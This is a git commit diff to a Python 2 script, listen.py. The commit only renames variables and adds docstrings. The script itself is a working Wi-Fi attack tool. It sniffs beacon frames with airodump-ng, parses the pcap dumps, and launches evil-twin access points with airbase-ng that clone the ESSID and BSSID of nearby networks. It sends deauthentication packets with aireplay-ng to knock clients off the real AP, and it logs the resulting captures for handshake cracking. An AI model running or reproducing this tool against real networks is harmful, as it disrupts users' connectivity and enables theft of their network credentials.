1d81fcce9342c413b7a2cd01ea9bcffd251e2d2f
corporate <vu.dzyubin@gmail.com>
2022-03-10 11:19:01 +0300

    input variable names changed; comments added

--- listen.py
+++ listen.py
@@ -9,42 +9,62 @@ cache = []
 dump_num = 1
 
 
-def start_AP(essid, bssid, interface, path, channel):
+def start_AP(essid, bssid, netw_iface, path, channel):
+    '''
+    start new access point with certain parameters
+    input:
+        essid - essid of access point
+        bssid - bssid of access point
+        netw_iface - network interface name
+        path - current dir
+        channel - AP channel
+    output:
+        no
+    '''
     try:
         import subprocess
-        subprocess.check_call(["airmon-ng", "start", interface, channel])
+        subprocess.check_call(["airmon-ng", "start", netw_iface, channel])
         
         kill = lambda process: process.terminate()
         import os
         os.chdir(path + "/logs/")
         if bssid == b"\xff\xff\xff\xff\xff\xff":
-            cmd = subprocess.Popen(["airbase-ng", "--essid", essid, "-c", channel, "-F", essid + "_log", "-Z", "4", interface + "mon"])
+            cmd = subprocess.Popen(["airbase-ng", "--essid", essid, "-c", channel, "-F", essid + "_log", "-Z", "4", netw_iface + "mon"])
         else:
-            cmd = subprocess.Popen(["airbase-ng", "--essid", essid,"-a", hexlify(bssid), "-c", channel, "-F", essid + "_log", "-Z", "4", interface + "mon"])           
+            cmd = subprocess.Popen(["airbase-ng", "--essid", essid,"-a", hexlify(bssid), "-c", channel, "-F", essid + "_log", "-Z", "4", netw_iface + "mon"])           
         timer = threading.Timer(3, kill, [cmd])
         try:
             timer.start()
             if (bssid) != b"\xff\xff\xff\xff\xff\xff":
-                subprocess.check_call(["aireplay-ng", "-e", essid, "-a", hexlify(bssid), "--deauth", "4", interface + "mon"])
+                subprocess.check_call(["aireplay-ng", "-e", essid, "-a", hexlify(bssid), "--deauth", "4", netw_iface + "mon"])
             stdout, stderr = cmd.communicate()
         finally:
             timer.cancel()
-            subprocess.check_call(["airmon-ng", "stop", interface + "mon", channel])
+            subprocess.check_call(["airmon-ng", "stop", netw_iface + "mon", channel])
             #subprocess.call(["python", path + "/converter_p.2.7.py", essid + "_log-01.cap", "hccap"])
 
     except Exception, e:
        print e
 
 
-def monitor(dump, interface, path):
+def lookup_dump(pcap_dump, netw_iface, path):
+    '''
+    lookup pcap dump and collect AP's and client's beacon packets
+    input:
+        pcap_dump - file 
+        netw_iface - network interface name
+        path - current dir
+    output:
+        no
+    '''
     packet_index = -1
     error_index = 0
     flag = False
-    print "\n" + dump + " file is being investigated\n"
+    print "\n" + pcap_dump + " file is being investigated\n"
     try:
         while True:
             try:
-                f = open(path + "/dumps/" + dump, 'rb')
+                f = open(path + "/dumps/" + pcap_dump, 'rb')
                 from pcapParser import load_savefile
                 caps, header = load_savefile(f)
                 packets = caps.packets
@@ -69,7 +89,7 @@ def monitor(dump, interface, path):
                                 rates_len = int(unhexlify(packets[packet_index][1].packet)[38 + essid_len + 1].encode("hex"), 16)
                                 channel = int(unhexlify((packets[packet_index][1].packet))[38 + essid_len + 1 + rates_len + 1 + 1 + 1].encode("hex"), 16)
                                 #print "\nBSSID: " + str(bssid) + " " + hexlify(bssid) + " of length " + str(len(bssid)) + "\n"
-                                task_AP = Thread(start_AP(current_essid, bssid, interface, path, str(channel)))
+                                task_AP = Thread(start_AP(current_essid, bssid, netw_iface, path, str(channel)))
                                 task_AP.start()
                         # ---------
                     
@@ -83,7 +103,7 @@ def monitor(dump, interface, path):
                                 cache.append(current_essid)
                                 # ------
                                 from threading import Thread
-                                task_AP = Thread(start_AP(current_essid, b"\xff\xff\xff\xff\xff\xff", interface, path, str(1)))
+                                task_AP = Thread(start_AP(current_essid, b"\xff\xff\xff\xff\xff\xff", netw_iface, path, str(1)))
                                 task_AP.start()
                         # ---------
                     
@@ -116,7 +136,16 @@ def monitor(dump, interface, path):
         exit(1)
 
 
-def start_sniff(interface, path):
+def start_sniff(netw_iface, path):
+    '''
+    lookup for pcap dump files in /logs folder
+    input:
+        pcap_dump - file 
+        netw_iface - network interface name
+        path - current dir
+    output:
+        no
+    '''
     import os
     os.chdir(path + "/logs/")
     # -------------------------------------
@@ -127,7 +156,7 @@ def start_sniff(interface, path):
         else:
             dump = "beac_dump-" + str(i) + ".cap"
 
-        monitor(dump, interface, path)
+        lookup_dump(dump, netw_iface, path)
         i += 1
 
 
@@ -135,17 +164,25 @@ def timeout(p):
 	p.kill()
 
 
-def start_mon(interface, path):
+def start_mon(netw_iface, path):
+    '''
+    monitor broadcast and save anything to pcap dump files in /logs folder
+    input:
+        netw_iface - network interface name
+        path - current dir
+    output:
+        no
+    '''
     import os
     os.chdir(path + "/dumps/")
     i = 0
     from random import randint
-    subprocess.call(["airmon-ng", "start", interface, str(randint(1, 14))])
+    subprocess.call(["airmon-ng", "start", netw_iface, str(randint(1, 14))])
     try:
     	while i < dump_num:
 			os.chdir(path + "/dumps/")
 			kill = lambda process: process.terminate()
-			cmd = subprocess.Popen(["airodump-ng", interface + "mon", "--beacons", "--write", "beac_dump"])
+			cmd = subprocess.Popen(["airodump-ng", netw_iface + "mon", "--beacons", "--write", "beac_dump"])
 			timer = threading.Timer(5, kill, [cmd])
 			try:
 				timer.start()
@@ -158,7 +195,14 @@ def start_mon(interface, path):
     	exit(1)
 
 
-def createParser ():
+def createParser():
+    '''
+    create parser identity to parse cmd args
+    input:
+        no
+    output:
+        no
+    '''
     parser = argparse.ArgumentParser()
     parser.add_argument ('-s', '--send', type=str, default = '', help='name of the interface that is to be used for listening')
     parser.add_argument ('-l', '--listen', type=str, default = '', help = 'name of the interface that is going to be used for creating AP and for sending deauth packets')
